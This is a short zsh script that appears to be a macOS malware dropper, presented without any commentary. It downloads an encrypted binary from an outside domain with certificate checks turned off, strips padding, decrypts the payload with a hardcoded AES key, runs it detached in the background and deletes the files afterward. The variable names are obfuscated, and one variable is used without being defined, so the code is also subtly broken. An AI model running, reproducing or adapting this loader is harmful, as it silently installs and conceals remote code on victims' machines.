#!/bin/zsh
nnfkt=$(mktemp /tmp/j4uxw9.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m6ada6978691b968f.bin" -o "$nnfktz" || exit 1
tapukc=$(stat -f %z "$nnfktz"); yu7xndd=$(( tapukc - 2841 - 736 ))
tail -c +$(( 2841 + 1 )) "$nnfktz" | head -c $yu7xndd | openssl enc -d -aes-256-cbc -k 59f7fd6201cbcd05263cd47f -out "$nnfkt" 2>/dev/null
[ -s "$nnfkt" ] && chmod 700 "$nnfkt" && ( "$nnfkt" & ) && disown
( sleep 3; rm -f "$nnfkt" "$nnfktz" ) &>/dev/null &
